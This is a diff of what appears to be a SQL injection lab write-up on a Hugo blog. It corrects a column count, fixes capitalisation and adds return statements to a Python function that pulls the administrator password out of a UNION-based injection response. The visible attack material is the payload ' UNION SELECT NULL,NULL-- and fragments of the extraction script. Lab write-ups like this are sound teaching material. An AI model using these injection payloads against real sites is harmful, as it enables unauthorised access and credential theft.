@@ -302,7 +302,7 @@ for i in range(10):
 
 ##### Running The Script: {#running-the-script}
 
-As we can see it tells what we expect, there are 3 columns and the correction payload is:
+As we can see it tells what we expect, there are 2 columns and the correction payload is:
 
 ```sql
 ' UNION SELECT NULL,NULL--
@@ -492,7 +492,7 @@ def extractSQLusers():
 ```
 
 **Function definition &amp; payload**
-First we define the function called `extractSQLusers` We then declare our `sqlPayload`.
+First we define the function called `extractSQLusers` we then declare our `sqlPayload`.
 
 ```python
 def extractSQLusers():
@@ -514,6 +514,8 @@ if "administrator" in response:
     soup = BeautifulSoup(request.text, 'html.parser')
     administratorPass= soup.body.find(string='administrator').parent.find_next('td').contents[0]
     print(f"The administrator password is: {administratorPass}")
+    return True
+return False
 ```
 
 If we find the string "administrator" in the response this tells us the table of users has been returned.
@@ -539,7 +541,7 @@ We now call the function so it runs after our other conditions are satisfied.
 As we can see it works when we run it and we are given the administrators password.
 ![](/ox-hugo/2025-11-13_08-05.png)
 
-
+    
 #### Whole Script: {#whole-script}
 
 ```python
